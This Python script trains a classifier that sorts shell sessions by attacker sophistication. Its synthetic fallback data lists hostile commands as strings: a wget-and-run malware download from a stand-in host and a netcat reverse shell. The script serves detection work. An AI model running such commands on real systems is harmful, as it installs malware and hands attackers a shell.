"""
Training script for the ThreatClassifier model.
"""

import argparse
import logging
import os
import json
import yaml
import pandas as pd
import numpy as np
from rich.console import Console
from sklearn.model_selection import train_test_split, cross_val_score
from datasets import load_from_disk

from src.features import extract_features, derive_label, build_feature_matrix
from src.classifier import ThreatClassifier
from src.parser import parse_logs
from src.evaluator import compute_metrics, plot_confusion_matrix, plot_feature_importance

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
console = Console()

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Train ThreatClassifier model")
    parser.add_argument("--config", type=str, default="config/config.yaml", help="Path to config file")
    parser.add_argument("--output", type=str, default="models/xgboost_model.pkl", help="Output model path")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    parser.add_argument("--test-size", type=float, default=0.2, help="Test split size")
    parser.add_argument("--no-cv", action="store_true", help="Disable cross-validation")
    return parser.parse_args()

def load_data(config_path: str):
    """
    Load dataset from HuggingFace cache or generate synthetic fallback.
    
    Args:
        config_path (str): Path to configuration file.
        
    Returns:
        list: List of parsed session dictionaries.
    """
    dataset_path = "data/shell_dataset/sessions"
    if os.path.exists(dataset_path):
        try:
            ds = load_from_disk(dataset_path)
            sessions = []
            for item in ds:
                sessions.append({
                    "session_id": item.get("id", "unknown"),
                    "commands": item.get("commands", []),
                    "duration_sec": item.get("duration", 0),
                })
            return sessions
        except Exception as e:
            logging.warning(f"Failed to load dataset from disk: {e}")
            
    # Synthetic fallback
    logging.info("Using synthetic fallback data.")
    sessions = [
        {"session_id": "s1", "commands": ["whoami"], "duration_sec": 1.0, "command_count": 1},
        {"session_id": "s2", "commands": ["ls", "wget http://bad.com/malware", "chmod +x malware", "./malware"], "duration_sec": 120.0, "command_count": 4},
        {"session_id": "s3", "commands": ["sudo su", "nc -e /bin/sh 10.0.0.1 4444"], "duration_sec": 300.0, "command_count": 2}
    ] * 100  # Duplicate to create 300 samples
    return sessions

def main():
    """Main training pipeline."""
    args = parse_args()
    
    # Load config
    config = {}
    if os.path.exists(args.config):
        try:
            with open(args.config, 'r', encoding='utf-8') as f:
                config = yaml.safe_load(f) or {}
        except IOError as e:
            logging.error(f"Failed to read config: {e}")
            
    # Load data
    raw_sessions = load_data(args.config)
    
    # Build feature matrix
    df = build_feature_matrix(raw_sessions)
    
    # Derive labels
    labels = []
    for _, row in df.iterrows():
        vi = (row.get("command_count", 0) * 0.5) + (row.get("privilege_escalation", 0) * 2.0)
        labels.append(derive_label(vi))
    df["label"] = labels
    
    label_map = {"Scanner": 0, "Amateur": 1, "Advanced": 2}
    y = np.array([label_map[l] for l in df["label"]])
    X = df.drop(columns=["session_id", "label"], errors="ignore").values
    feature_names = df.drop(columns=["session_id", "label"], errors="ignore").columns.tolist()
    
    # Train/Test Split
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=args.test_size, random_state=args.seed, stratify=y)
    
    classifier = ThreatClassifier(args.config)
    
    # Cross validation
    if not args.no_cv:
        logging.info("Running 5-fold cross-validation...")
        scores = cross_val_score(classifier.model, X_train, y_train, cv=5, scoring="accuracy")
        console.print(f"CV Accuracy: {scores.mean():.4f} (+/- {scores.std() * 2:.4f})", style="bold green")
        
    metrics = classifier.train(X_train, y_train, X_test, y_test)
    console.print("Training Metrics:", metrics)
    
    # Save model
    classifier.save(args.output)
    
    # Evaluate
    eval_metrics = classifier.evaluate(X_test, y_test)
    
    # Save results
    results_path = "results.json"
    try:
        with open(results_path, 'w', encoding='utf-8') as f:
            json.dump(eval_metrics, f, indent=4)
        logging.info(f"Saved results to {results_path}")
    except IOError as e:
        logging.error(f"Failed to save results: {e}")
        
    console.print("[bold cyan]Training Complete.[/bold cyan]")

if __name__ == "__main__":
    main()
